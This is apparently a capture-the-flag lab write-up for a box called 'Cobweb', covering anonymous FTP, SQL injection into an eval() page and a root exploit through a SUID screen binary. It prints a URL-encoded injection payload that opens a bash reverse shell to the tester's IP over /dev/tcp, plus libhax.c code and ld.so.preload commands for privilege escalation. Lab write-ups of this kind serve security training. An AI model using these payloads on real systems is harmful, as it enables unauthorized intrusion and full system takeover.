---
description: Hard.
---

# Cobweb

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.162
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 14:41 +08
Nmap scan report for 192.168.157.162
Host is up (0.18s latency).
Not shown: 65483 filtered tcp ports (no-response), 47 filtered tcp ports (host-unreach)
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
3306/tcp open   mysql
9090/tcp closed zeus-admin
```

Quite a few ports open.&#x20;

### FTP -> access.log

We can check whether FTP accepts anonymous logins, which it does!

```
$ ftp 192.168.157.162
Connected to 192.168.157.162.
220 (vsFTPd 3.0.3)
Name (192.168.157.162:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||32481|)
ftp: Can't connect to `192.168.157.162:32481': No route to host
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0              54 Aug 27  2021 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 501      20            955 Aug 27  2021 access.log
-rw-r--r--    1 501      20            530 Aug 27  2021 auth.log
-rw-r--r--    1 501      20            176 Aug 27  2021 syslog
```

We can download the log files and view them. `access.log` reveals a hidden file on one of the web applications:

```
$ cat access.log                          
<TRUNCATED>
192.168.118.5 - - [27/Aug/2021:08:47:04 -0400] "GET /.index.php.swp HTTP/1.1" 200 5422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
<TRUNCATED>
```

The other files weren't so interesting.&#x20;

### Source Code Review -> Eval + SQL Injection

Port 80 reveals a standard login:

<figure><img src="../../../.gitbook/assets/image (3196).png" alt=""><figcaption></figcaption></figure>

We can view the found found earlier to find PHP source code:

```php
## curl http://192.168.157.162/.index.php.swp
<?php
http_response_code(200);

function get_page($conn, $route_string){
    $sql = "SELECT page_data FROM webpages WHERE route_string = \"" . $route_string . "\";";
    //echo "<!-- " . $sql . " -->";
    if(mysqli_multi_query($conn, $sql)){
        $results = mysqli_use_result($conn);
        $first_row = mysqli_fetch_row($results);
        echo mysqli_error($conn);
        return($first_row[0]);
    }else{
        http_response_code(404);
        echo mysqli_error($conn);
        return("");
    }

}

define("included", true);
include "config.php";

$conn = mysqli_connect($db_server, $db_username, $db_password, $db_database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if(isset($_SERVER['REDIRECT_URL'])){
    $route_string = $_SERVER['REDIRECT_URL'];
    eval(get_page($conn, $route_string));
}else{
    eval(get_page($conn, "/"));
}


mysqli_close($conn);

?>
```

We can see that there's an SQL Injection within the `get_page` function. The `redirect_url` is taken as the `$route_string` variable. If we attempt basic injection, it redirects us to `phpinfo.php`:

<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

Within this, we can see that there are no disabled functions, and that the document root is at `/var/www/html`:

<figure><img src="../../../.gitbook/assets/image (3712).png" alt=""><figcaption></figcaption></figure>

I attempted to write some files, but it fails:

<figure><img src="../../../.gitbook/assets/image (3707).png" alt=""><figcaption></figcaption></figure>

So writing webshells won't work. When I looked at the code again, I saw that it was using `eval()` after the `get_page` function returns. This means that if we can somehow make the function return PHP code, it would be executed in `eval()`.&#x20;

{% embed url="https://stackoverflow.com/questions/23862873/can-you-sql-inject-a-php-variable-comparison" %}

We know that the database is called `webpages`, and that there are 2 columns in it called `page_data` and `route_string`. Using this knowledge, let's try `INSERT INTO` to get RCE.

I tried creating a new directory with one PHP payload on it:

{% code overflow="wrap" %}
```sql
";INSERT INTO webpages(route_string, page_data) VALUES ('/rev', 'echo shell_exec("bash -i >& /dev/tcp/192.168.45.227/80 0>&1");'); --

## after URL encoding
%22%3BINSERT%20INTO%20webpages%28route_string%2C%20page_data%29%20VALUES%20%28%27%2Frev%27%2C%20%27echo%20shell_exec%28%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.227%2F80%200%3E%261%22%29%3B%27%29%3B%20--
```
{% endcode %}

Then visit `index.php` with that payload and visit `/rev`.&#x20;

{% code overflow="wrap" %}
```bash
$ curl http://192.168.157.162/%22%3BINSERT%20INTO%20webpages%28route_string%2C%20page_data%29%20VALUES%20%28%27%2Frev%27%2C%20%27echo%20shell_exec%28%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.227%2F80%200%3E%261%22%29%3B%27%29%3B%20--

$ curl http://192.168.157.162/rev
```
{% endcode %}

We would then get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (2860).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Upgrade Shell

I used `script` to upgrade the shell:

```bash
script /dev/null -c bash
Ctrl + Z 
stty raw -echo;fg
```

<figure><img src="../../../.gitbook/assets/image (3732).png" alt=""><figcaption></figcaption></figure>

### Screen Capabilities -> Root

We can run `bash linpeas.sh` to enumerate for us. It didn't reveal anything obvious besides this SUID binary:

```
-rwsr-xr-x. 1 root root               1.7M Aug 27  2021 /usr/bin/screen-4.5.0
```

This version of `screen` is exploitable:

{% embed url="https://www.exploit-db.com/exploits/41154" %}

However, when we run the exploit in `/dev/shm` and `/tmp`, it doesn't work:

```
bash: /dev/shm/rootshell: Permission denied
bash-4.4$ ls -la /dev/shm
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '/dev/shm/libhax.so' from /etc/ld.so.preload cannot be preloaded (failed to map segment from shared object): ignored.
total 32
drwxrwxrwt  2 root   root      80 Jul 14 03:38 .
drwxr-xr-x 19 root   root    3020 Jul 14 03:33 ..
-rwxrwxrwx  1 apache apache 15528 Jul 14 03:38 libhax.so
-rwxrwxrwx  1 apache apache 16168 Jul 14 03:37 rootshell
```

We are being denied permission despite the permissions being correct and doing the exploit correctly. I googled the problem and found this:

{% embed url="https://stackoverflow.com/questions/38965819/file-capabilities-do-not-transfer-to-process-once-executed" %}

So as I learned, directories themselves have capabilities, and `nosuid` can be one of them preventing us from running `setuid` functions even if we have the right exploit. We can find other writeable directories:

```
bash-4.4$ find / -type d -writable -exec ls -adl {} \; 2>/dev/null
drwxrwxrwt 2 root root 40 Feb 17 16:21 /dev/mqueue
drwxrwxrwt 2 root root 40 Feb 17 16:21 /dev/shm
dr-x------ 2 apache apache 0 Jul 14 03:48 /proc/2219/task/2219/fd
dr-x------ 2 apache apache 0 Jul 14 03:48 /proc/2219/fd
dr-x------ 2 apache apache 0 Jul 14 03:48 /proc/2219/map_files
drwxrwx---. 2 root apache 6 May  6  2020 /var/lib/php/opcache
drwxrwx---. 2 root apache 6 May  6  2020 /var/lib/php/session
drwxrwx---. 2 root apache 6 May  6  2020 /var/lib/php/wsdlcache
drwx------. 2 apache apache 6 May 20  2021 /var/lib/dav
drwx------. 2 apache apache 6 May 20  2021 /var/lib/httpd
drwxrwx---. 2 apache root 23 Jan 29 02:41 /var/log/php-fpm
drwx------. 3 apache apache 19 Aug 27  2021 /var/cache/httpd
drwx------. 2 apache apache 6 May 20  2021 /var/cache/httpd/proxy
drwxrwxrwt 2 root root 6 Feb 17 16:22 /var/tmp
drwxrwxrwt 2 root root 40 Feb 17 16:22 /tmp
```

I used `/var/lib/php/session`, and it worked properly. Replace the directories within `libhax.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/var/lib/php/session/rootshell", 0, 0);
    chmod("/var/lib/php/session/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

Then, compile both exploits and transfer them to the machine:

```bash
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -o rootshell rootshell.c
```

Go to the `/etc` directory and run these:

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/var/lib/php/session/libhax.so"
/var/lib/php/session/rootshell
```

<figure><img src="../../../.gitbook/assets/image (3186).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
